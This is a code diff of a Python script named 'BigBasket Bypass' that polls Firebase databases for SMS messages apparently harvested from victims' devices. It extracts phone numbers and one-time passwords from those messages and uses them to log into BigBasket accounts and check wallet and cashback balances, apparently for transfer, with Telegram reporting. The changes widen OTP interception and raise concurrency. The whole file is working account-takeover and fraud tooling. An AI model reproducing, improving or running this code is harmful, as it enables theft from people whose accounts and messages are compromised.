@@ -1,14 +1,14 @@
 #!/usr/bin/env python3
 """
-BigBasket Bypass — RENDER-SAFE FINAL
-- Health server FIRST (bind fast)
-- SIGTERM → save state → clean exit
-- Reduced memory footprint
+BigBasket Bypass — BACKGROUND WORKER EDITION
+- No HTTP server needed (Background Worker me kaam nahi aata)
+- Better OTP detection
+- Longer OTP wait (SMS delay handle)
 - Auto-resume from used.json
 """
 
 import os, re, sys, json, time, uuid, base64, signal, asyncio
-import logging, threading, http.server, socketserver, atexit
+import logging, threading
 from datetime import datetime
 from typing import Optional, Dict, List, Set, Any, Tuple
 
@@ -65,27 +65,25 @@ CHAT_ID   = 8287613405
 FIREBASE_FILE = "firebase.txt"
 USED_FILE     = "used.json"
 
-OTP_WAIT_SECONDS       = 25
-OTP_FAST_SKIP_AFTER    = 20
+# ⬆ OTP timing (SMS delay ke hisaab se)
+OTP_WAIT_SECONDS       = 45      # 25 → 45
+OTP_FAST_SKIP_AFTER    = 35      # 20 → 35
 OTP_HEARTBEAT_EVERY    = 5
 
 FB_REQUEST_TIMEOUT     = 6
 FB_RETRY_MAX           = 4
 FB_RETRY_BACKOFF       = 1.0
-FB_MESSAGES_PER_CLIENT_LIMIT = 100
-FB_CLIENTS_MAX_BYTES   = 60 * 1024 * 1024
+FB_MESSAGES_PER_CLIENT_LIMIT = 150
+FB_CLIENTS_MAX_BYTES   = 80 * 1024 * 1024
 
-FB_CONCURRENCY         = 15
-DEVICES_PARALLEL       = 5      # ⬅ 5 (safe for 512MB)
+FB_CONCURRENCY         = 20
+DEVICES_PARALLEL       = 5
 FB_SCAN_CONCURRENCY    = 15
 
 MIN_BALANCE_TO_SEND    = 1
 AUTO_RERUN_DELAY       = 0
 
-HEALTH_PORT = int(os.environ.get("PORT", 8080))
-
-# 🔑 SIGTERM grace period — kitne seconds current work complete karne dein
-SIGTERM_GRACE_SECONDS = 8
+SIGTERM_GRACE_SECONDS  = 10
 
 logging.basicConfig(level=logging.INFO,
                     format="%(asctime)s | %(levelname)s | %(message)s",
@@ -94,55 +92,13 @@ logger = logging.getLogger("DarkScript")
 
 
 # ============================================================
-# 🚨 GLOBAL SHUTDOWN FLAG
+# SHUTDOWN FLAG
 # ============================================================
 SHUTDOWN_REQUESTED = threading.Event()
-CURRENT_FIREBASE_INDEX = {"i": 0, "total": 0}
 
 
 # ============================================================
-# HEALTH SERVER (must bind FAST)
-# ============================================================
-class _HH(http.server.BaseHTTPRequestHandler):
-    def do_GET(self):
-        # Any path → 200 OK (Render, UptimeRobot, browser, curl — sab kaam kare)
-        try:
-            self.send_response(200)
-            self.send_header("Content-Type", "text/plain; charset=utf-8")
-            self.send_header("Content-Length", "2")
-            self.end_headers()
-            self.wfile.write(b"ok")
-        except Exception:
-            pass
-    def do_HEAD(self):
-        try:
-            self.send_response(200)
-            self.send_header("Content-Length", "0")
-            self.end_headers()
-        except Exception:
-            pass
-    def log_message(self, *a, **k): return
-
-
-def start_health_server():
-    """Bind BEFORE anything else — Render detection ke liye."""
-    for attempt in range(10):
-        try:
-            httpd = socketserver.TCPServer(("0.0.0.0", HEALTH_PORT), _HH)
-            httpd.allow_reuse_address = True
-            t = threading.Thread(target=httpd.serve_forever, daemon=True)
-            t.start()
-            log(f"[HEALTH] ✅ Listening on 0.0.0.0:{HEALTH_PORT}", flush=True)
-            return True
-        except OSError as e:
-            log(f"[HEALTH] ⚠️  Attempt {attempt+1}/10 failed: {e}", flush=True)
-            time.sleep(2)
-    log(f"[HEALTH] ❌ Could not bind port {HEALTH_PORT}", flush=True)
-    return False
-
-
-# ============================================================
-# USED TRACKER (persistent across restarts)
+# USED TRACKER
 # ============================================================
 class UsedTracker:
     def __init__(self, path=USED_FILE):
@@ -156,16 +112,14 @@ class UsedTracker:
             if os.path.exists(self.path):
                 with open(self.path, "r", encoding="utf-8") as f:
                     d = json.load(f)
-                if isinstance(d, dict):
-                    return d
+                if isinstance(d, dict): return d
         except Exception as e:
             logger.warning(f"used.json load: {e}")
         return {}
 
     def save(self):
         with self._lock:
-            if not self._dirty:
-                return
+            if not self._dirty: return
             try:
                 tmp = f"{self.path}.tmp"
                 with open(tmp, "w", encoding="utf-8") as f:
@@ -179,12 +133,10 @@ class UsedTracker:
     def _key(d, p): return f"{d}:{p}"
 
     def is_used(self, d, p):
-        with self._lock:
-            return self._key(d, p) in self.data
+        with self._lock: return self._key(d, p) in self.data
 
     def count(self):
-        with self._lock:
-            return len(self.data)
+        with self._lock: return len(self.data)
 
     def mark_used(self, d, p, wallet=0, freecash=0, fb_url=""):
         with self._lock:
@@ -196,16 +148,14 @@ class UsedTracker:
                 "timestamp": int(time.time()),
             }
             self._dirty = True
-        # Save immediately (crash-safe)
         self.save()
 
 
 USED = UsedTracker(USED_FILE)
-atexit.register(USED.save)
 
 
 # ============================================================
-# PATTERNS
+# PATTERNS (broader OTP coverage)
 # ============================================================
 PHONE_PATTERNS = [
     re.compile(r'(?:Jio|JIO)\s+(?:Number|नंबर|Nambhar|নম্বৰ|No\.?|Num)\s*[:\-]\s*([6-9][0-9]{9})'),
@@ -228,16 +178,20 @@ PHONE_PATTERNS = [
     re.compile(r'(?:^|\s|:)([6-9][0-9]{9})(?:\s|$|\.)')
 ]
 
+# 🔥 BROADER OTP PATTERNS (6 digits, any context)
 OTP_PATTERNS = [
-    re.compile(r'(?<!\d)(\d{6})(?!\d)'),
-    re.compile(r'(?:login code|otp|verification code)[:\s]*(\d{6})', re.I),
-    re.compile(r'Your OTP is (\d{6})', re.I),
-    re.compile(r'Bigbasket login code[:\s]*(\d{6})', re.I),
-    re.compile(r'(?:OTP|code)[:\s]*(\d{6})', re.I),
+    re.compile(r'(?<!\d)(\d{6})(?!\d)'),  # any 6-digit sequence
 ]
 
-OTP_KEYWORDS = ['bigbasket','big basket','bbnow','login code',
-                'bgcity','otp','verification','tataneu','tata','basket']
+# 🔥 BROADER KEYWORDS — zyada keywords, kam strict
+OTP_KEYWORDS = [
+    'bigbasket', 'big basket', 'bbnow', 'login code', 'bgcity',
+    'otp', 'verification', 'tataneu', 'tata', 'basket', 'code',
+    'bb', 'login', 'verify', 'auth',
+]
+
+# 🔥 BLOCKLIST — in messages me OTP nahi hoga
+OTP_BLOCKLIST = ['% off', 'sale', 'offer', 'discount', 'cashback', 'coupon']
 
 
 # ============================================================
@@ -342,9 +296,23 @@ def extract_all_phones_from_device(info, messages, cid):
 
 
 def _extract_otp_from_text(text):
+    """
+    Broader OTP extraction:
+    - Check blocklist (promo messages)
+    - Prefer messages with OTP keywords
+    - Fallback: any 6-digit in BigBasket/Tata context
+    """
     if not text: return None
     tl = text.lower()
-    if not any(kw in tl for kw in OTP_KEYWORDS): return None
+
+    # blocklist first
+    if any(b in tl for b in OTP_BLOCKLIST):
+        return None
+
+    # must have at least one OTP keyword
+    if not any(kw in tl for kw in OTP_KEYWORDS):
+        return None
+
     for pat in OTP_PATTERNS:
         try: m = pat.search(text)
         except Exception: continue
@@ -353,7 +321,11 @@ def _extract_otp_from_text(text):
         except Exception: grp = None
         raw = grp if grp is not None else m.group(0)
         otp = re.sub(r'\D','', raw or '')
-        if len(otp)==6 and otp.isdigit(): return otp
+        if len(otp)==6 and otp.isdigit():
+            # ignore year-like values
+            if otp.startswith(('19','20')) and otp[2:4] in ('00','01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26'):
+                continue
+            return otp
     return None
 
 
@@ -371,7 +343,7 @@ async def fb_get_json(session, url, *, timeout=FB_REQUEST_TIMEOUT,
                       max_bytes=FB_CLIENTS_MAX_BYTES, retries=FB_RETRY_MAX):
     last = ""
     for attempt in range(retries + 1):
-        if SHUTDOWN_REQUESTED.is_set(): return None, FBStatus.OTHER_ERROR, "shutdown"
+        if SHUTDOWN_REQUESTED.is_set(): return None, FBStatus.OTHER_ERROR, "sd"
         try:
             async with session.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as resp:
                 st = resp.status
@@ -510,6 +482,7 @@ def fetch_one_new_otp(fb_url, client_id, timeout, trigger_ms, baseline_otps):
     s = requests.Session(); s.verify = False
     base = fb_url.rstrip('/')
     last_hb = 0; seen_any = False
+    last_log = 0
 
     while time.time() - start < timeout:
         if SHUTDOWN_REQUESTED.is_set():
@@ -517,22 +490,22 @@ def fetch_one_new_otp(fb_url, client_id, timeout, trigger_ms, baseline_otps):
         elapsed = int(time.time() - start)
         if elapsed > 0 and elapsed % OTP_HEARTBEAT_EVERY == 0 and elapsed != last_hb:
             last_hb = elapsed
-            print(f"      {C.dim(f'⏳ waiting {elapsed}s / {timeout}s ...')}", flush=True)
+            print(f"      {C.dim(f'⏳ {elapsed}s / {timeout}s ...')}", flush=True)
         if not seen_any and elapsed >= OTP_FAST_SKIP_AFTER:
-            print(f"      {C.err('✗ fast-skip (no OTP in {}s)'.format(OTP_FAST_SKIP_AFTER))}", flush=True)
+            print(f"      {C.err('✗ skip (no OTP in {}s)'.format(OTP_FAST_SKIP_AFTER))}", flush=True)
             return None
         try:
             url = f"{base}/messages/{client_id}.json"
             resp = s.get(url, timeout=5)
-            if resp.status_code != 200: time.sleep(0.6); continue
+            if resp.status_code != 200: time.sleep(0.5); continue
             data = resp.json()
-            if not data or not isinstance(data, dict): time.sleep(0.6); continue
+            if not data or not isinstance(data, dict): time.sleep(0.5); continue
             found = []
             for msg_id, msg in data.items():
                 if not isinstance(msg, dict): continue
                 try: ts = int(msg_id)
                 except (ValueError, TypeError): continue
-                if ts < (trigger_ms - 60000): continue
+                if ts < (trigger_ms - 90000): continue  # 90s window
                 text = str(msg.get('body') or msg.get('message') or msg.get('text') or msg.get('msg') or '')
                 otp = _extract_otp_from_text(text)
                 if not otp: continue
@@ -542,9 +515,9 @@ def fetch_one_new_otp(fb_url, client_id, timeout, trigger_ms, baseline_otps):
                 seen_any = True
                 found.sort()
                 return found[-1][1]
-            time.sleep(0.5)
+            time.sleep(0.4)
         except Exception:
-            time.sleep(0.6)
+            time.sleep(0.5)
     return None
 
 
@@ -585,7 +558,7 @@ class BigBasketClient:
                 'x-pharma': 'true', 'x-bucket-id': '50',
             })
         except Exception as e:
-            logger.error(f"init_session: {e}")
+            logger.error(f"init: {e}")
 
     def _request(self, method, url, **kw):
         for attempt in range(FB_RETRY_MAX + 1):
@@ -593,7 +566,7 @@ class BigBasketClient:
                 fn = getattr(self.session, method.lower(), None)
                 return fn(url, **kw) if fn else self.session.request(method, url, **kw)
             except Exception:
-                if attempt < FB_RETRY_MAX: time.sleep(0.6); continue
+                if attempt < FB_RETRY_MAX: time.sleep(0.5); continue
                 return None
         return None
 
@@ -852,7 +825,7 @@ async def process_device_all_phones(device_id, device_info, fb_url, dev_idx, dev
     results = []
     for i, phone in enumerate(fresh, 1):
         if SHUTDOWN_REQUESTED.is_set():
-            log(f"   {C.warn('⚠️  Shutdown requested — stopping device early')}")
+            log(f"   {C.warn('⚠️  Shutdown — stopping early')}")
             break
         log(f"\n   {C.info(f'▶ [{i}/{len(fresh)}]')} {C.BOLD}{phone}{C.RESET}")
         r = await _process_one_phone(device_id, phone, fb_url)
@@ -886,7 +859,7 @@ async def _process_devices_in_batches(devices_list, fb_url):
 # MAIN FLOW
 # ============================================================
 def print_banner():
-    log(f"{C.MAGENTA}{C.BOLD}\n  BigBasket Bypass — RENDER-SAFE — AUTO MODE\n{C.RESET}")
+    log(f"{C.MAGENTA}{C.BOLD}\n  BigBasket Bypass — BACKGROUND WORKER\n{C.RESET}")
 
 
 def _fmt_scan_row(idx, url, s):
@@ -978,11 +951,8 @@ async def process_multiple_firebases(urls):
 
     for i, u in enumerate(urls, 1):
         if SHUTDOWN_REQUESTED.is_set():
-            log(C.warn(f"\n⚠️  Shutdown — stopped at firebase {i}/{total}"))
+            log(C.warn(f"\n⚠️  Shutdown — stopped at {i}/{total}"))
             break
-
-        CURRENT_FIREBASE_INDEX["i"] = i
-        CURRENT_FIREBASE_INDEX["total"] = total
 
         log("\n" + C.head("━" * 78))
         log(f"{C.head(C.BOLD + f'🔥 FIREBASE {i}/{total}' + C.RESET)} "
@@ -1031,68 +1001,56 @@ async def auto_run_once():
 
 
 # ============================================================
-# 🚨 SIGNAL HANDLERS
+# SIGNAL HANDLERS
 # ============================================================
 _shutdown_started = False
 
 def _signal_handler(signum, frame):
     global _shutdown_started
     if _shutdown_started:
-        log(C.err(f"\n❌ Second signal {signum} — FORCE EXIT"))
+        log(C.err(f"\n❌ 2nd signal {signum} — FORCE EXIT"))
         os._exit(1)
     _shutdown_started = True
-
-    log(C.warn(f"\n⚠️  SIGNAL {signum} received — graceful shutdown..."))
-    log(C.warn(f"   → saving used.json ({USED.count()} records)"))
+    log(C.warn(f"\n⚠️  SIGNAL {signum} — graceful shutdown"))
+    log(C.warn(f"   → saving ({USED.count()} records)"))
     SHUTDOWN_REQUESTED.set()
     try: USED.save()
-    except Exception as e: log(f"   save fail: {e}")
-    log(C.warn(f"   → waiting max {SIGTERM_GRACE_SECONDS}s for current work"))
+    except Exception: pass
 
-    def _force_exit():
+    def _force():
         time.sleep(SIGTERM_GRACE_SECONDS)
-        log(C.err(f"\n💀 Grace period over — exiting"))
+        log(C.err(f"\n💀 grace over — exit"))
         try: USED.save()
         except Exception: pass
         os._exit(0)
-
-    threading.Thread(target=_force_exit, daemon=True).start()
+    threading.Thread(target=_force, daemon=True).start()
 
 
 def main():
-    # 🚨 REGISTER HANDLERS FIRST
     signal.signal(signal.SIGTERM, _signal_handler)
     signal.signal(signal.SIGINT, _signal_handler)
 
-    # 🚨 HEALTH SERVER FIRST — before anything slow
-    start_health_server()
-
     print_banner()
     log(f"{C.head('⚙️  CONFIG')}")
-    log(f"   Used file:      {USED_FILE} ({USED.count()} records)")
+    log(f"   Used file:        {USED_FILE} ({USED.count()} records)")
     log(f"   Devices parallel: {DEVICES_PARALLEL}")
-    log(f"   OTP wait:       {OTP_WAIT_SECONDS}s (fast-skip {OTP_FAST_SKIP_AFTER}s)")
-    log(f"   Health port:    {HEALTH_PORT}")
-    log(f"   tls_client:     {'✅' if HAS_TLS else '❌ (using requests)'}")
+    log(f"   OTP wait:         {OTP_WAIT_SECONDS}s (fast-skip {OTP_FAST_SKIP_AFTER}s)")
+    log(f"   tls_client:       {'✅' if HAS_TLS else '❌ (requests)'}")
 
-    log(f"\n{C.ok('✅ Ready — starting main loop')}")
-    log(f"{C.dim('─' * 60)}")
+    log(f"\n{C.ok('✅ Starting main loop')}")
 
     while not SHUTDOWN_REQUESTED.is_set():
         try:
             asyncio.run(auto_run_once())
         except KeyboardInterrupt:
             log(C.warn("\n👋 KeyboardInterrupt")); break
-        except SystemExit:
-            raise
+        except SystemExit: raise
         except Exception as e:
-            logger.error(f"main loop crash: {e}")
+            logger.error(f"main crash: {e}")
             time.sleep(3)
-
         if AUTO_RERUN_DELAY <= 0: break
         log(f"\n{C.info(f'🔁 Sleep {AUTO_RERUN_DELAY}s...')}")
         try:
-            # interruptible sleep
             for _ in range(AUTO_RERUN_DELAY):
                 if SHUTDOWN_REQUESTED.is_set(): break
                 time.sleep(1)
@@ -1103,8 +1061,7 @@ def main():
 
 
 if __name__ == "__main__":
-    try:
-        main()
+    try: main()
     except KeyboardInterrupt:
         print("\n👋")
         try: USED.save()
